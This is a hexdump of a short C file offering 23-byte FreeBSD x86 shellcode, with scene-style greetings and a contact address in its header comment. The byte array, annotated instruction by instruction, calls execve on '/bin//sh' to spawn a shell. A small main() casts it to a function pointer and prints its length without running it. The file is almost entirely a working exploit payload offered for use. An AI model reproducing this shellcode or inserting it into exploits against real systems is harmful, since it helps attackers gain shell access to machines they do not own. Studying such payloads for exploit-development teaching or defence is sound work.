00000000  2f 2a 20 46 72 65 65 42  53 44 20 32 33 20 62 79  |/* FreeBSD 23 by|
00000010  74 65 20 65 78 65 63 76  65 20 63 6f 64 65 2e 20  |te execve code. |
00000020  47 72 65 65 74 7a 20 74  6f 20 61 6e 61 74 68 65  |Greetz to anathe|
00000030  6d 61 2c 20 74 68 65 20  66 69 72 73 74 20 77 68  |ma, the first wh|
00000040  6f 20 70 75 62 6c 69 73  68 65 64 20 20 2a 0a 20  |o published  *. |
00000050  2a 20 74 68 69 73 20 77  61 79 20 6f 66 20 77 72  |* this way of wr|
00000060  69 74 69 6e 67 20 73 68  65 6c 6c 63 6f 64 65 73  |iting shellcodes|
00000070  2e 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000080  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000090  20 20 20 20 20 20 20 20  20 20 20 20 2a 0a 20 2a  |            *. *|
000000a0  20 20 67 72 65 65 74 7a  20 74 6f 20 70 72 65 65  |  greetz to pree|
000000b0  64 61 74 6f 72 20 20 20  20 20 20 20 20 20 20 20  |dator           |
000000c0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000000d0  20 20 20 6d 61 72 63 65  74 61 6d 20 20 20 20 20  |   marcetam     |
000000e0  20 20 20 20 20 20 20 20  20 20 20 2a 0a 20 2a 20  |           *. * |
000000f0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
*
00000110  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 61  |               a|
00000120  64 6d 69 6e 40 6d 61 72  63 65 74 61 6d 2e 6e 65  |dmin@marcetam.ne|
00000130  74 20 20 20 20 20 20 20  20 20 2a 0a 20 2a 2a 2a  |t         *. ***|
00000140  2a 2a 2a 2a 2a 2a 2a 2a  2a 2a 2a 2a 2a 2a 2a 2a  |****************|
*
00000180  2a 2a 2a 2a 2a 2a 2a 2a  2a 2f 0a 0a 0a 63 68 61  |*********/...cha|
00000190  72 20 66 62 73 64 5f 65  78 65 63 76 65 5b 5d 3d  |r fbsd_execve[]=|
000001a0  0a 20 20 22 5c 78 39 39  22 20 20 20 20 20 20 20  |.  "\x99"       |
000001b0  20 20 20 20 20 20 20 20  20 20 20 2f 2a 20 63 64  |           /* cd|
000001c0  71 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2a  |q              *|
000001d0  2f 0a 20 20 22 5c 78 35  32 22 20 20 20 20 20 20  |/.  "\x52"      |
000001e0  20 20 20 20 20 20 20 20  20 20 20 20 2f 2a 20 70  |            /* p|
000001f0  75 73 68 20 25 65 64 78  20 20 20 20 20 20 20 20  |ush %edx        |
00000200  2a 2f 0a 20 20 22 5c 78  36 38 5c 78 36 65 5c 78  |*/.  "\x68\x6e\x|
00000210  32 66 5c 78 37 33 5c 78  36 38 22 20 20 2f 2a 20  |2f\x73\x68"  /* |
00000220  70 75 73 68 20 24 30 78  36 38 37 33 32 66 36 65  |push $0x68732f6e|
00000230  20 2a 2f 0a 20 20 22 5c  78 36 38 5c 78 32 66 5c  | */.  "\x68\x2f\|
00000240  78 32 66 5c 78 36 32 5c  78 36 39 22 20 20 2f 2a  |x2f\x62\x69"  /*|
00000250  20 70 75 73 68 20 24 30  78 36 39 36 32 32 66 32  | push $0x69622f2|
00000260  66 20 2a 2f 0a 20 20 22  5c 78 38 39 5c 78 65 33  |f */.  "\x89\xe3|
00000270  22 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |"              /|
00000280  2a 20 6d 6f 76 6c 20 25  65 73 70 2c 25 65 62 78  |* movl %esp,%ebx|
00000290  20 20 20 2a 2f 0a 20 20  22 5c 78 35 31 22 20 20  |   */.  "\x51"  |
000002a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002b0  2f 2a 20 70 75 73 68 20  25 65 63 78 20 2d 20 6f  |/* push %ecx - o|
000002c0  72 20 25 65 64 78 20 3a  29 20 2a 2f 0a 20 20 22  |r %edx :) */.  "|
000002d0  5c 78 35 32 22 20 20 20  20 20 20 20 20 20 20 20  |\x52"           |
000002e0  20 20 20 20 20 20 20 2f  2a 20 70 75 73 68 20 25  |       /* push %|
000002f0  65 64 78 20 2d 20 6f 72  20 25 65 63 78 20 3a 29  |edx - or %ecx :)|
00000300  20 2a 2f 0a 20 20 22 5c  78 35 33 22 20 20 20 20  | */.  "\x53"    |
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 2f 2a  |              /*|
00000320  20 70 75 73 68 20 25 65  62 78 20 20 20 20 20 20  | push %ebx      |
00000330  20 20 2a 2f 0a 20 20 22  5c 78 35 33 22 20 20 20  |  */.  "\x53"   |
00000340  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 2f  |               /|
00000350  2a 20 70 75 73 68 20 25  65 62 78 20 20 20 20 20  |* push %ebx     |
00000360  20 20 20 2a 2f 0a 20 20  22 5c 78 36 61 5c 78 33  |   */.  "\x6a\x3|
00000370  62 22 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |b"              |
00000380  2f 2a 20 70 75 73 68 20  24 30 78 33 62 20 20 20  |/* push $0x3b   |
00000390  20 20 20 20 2a 2f 0a 20  20 22 5c 78 35 38 22 20  |    */.  "\x58" |
000003a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000003b0  20 2f 2a 20 70 6f 70 20  25 65 61 78 20 20 20 20  | /* pop %eax    |
000003c0  20 20 20 20 20 2a 2f 0a  20 20 22 5c 78 63 64 5c  |     */.  "\xcd\|
000003d0  78 38 30 22 3b 20 20 20  20 20 20 20 20 20 20 20  |x80";           |
000003e0  20 20 2f 2a 20 69 6e 74  20 24 30 78 38 30 20 20  |  /* int $0x80  |
000003f0  20 20 20 20 20 20 2a 2f  0a 0a 0a 69 6e 74 20 6d  |      */...int m|
00000400  61 69 6e 28 29 20 7b 0a  20 20 76 6f 69 64 20 28  |ain() {.  void (|
00000410  2a 72 75 6e 29 28 29 3d  28 76 6f 69 64 20 2a 29  |*run)()=(void *)|
00000420  66 62 73 64 5f 65 78 65  63 76 65 3b 0a 20 20 70  |fbsd_execve;.  p|
00000430  72 69 6e 74 66 28 22 25  64 20 62 79 74 65 73 20  |rintf("%d bytes |
00000440  5c 6e 22 2c 73 74 72 6c  65 6e 28 66 62 73 64 5f  |\n",strlen(fbsd_|
00000450  65 78 65 63 76 65 29 29  3b 0a 7d                 |execve));.}|
0000045b
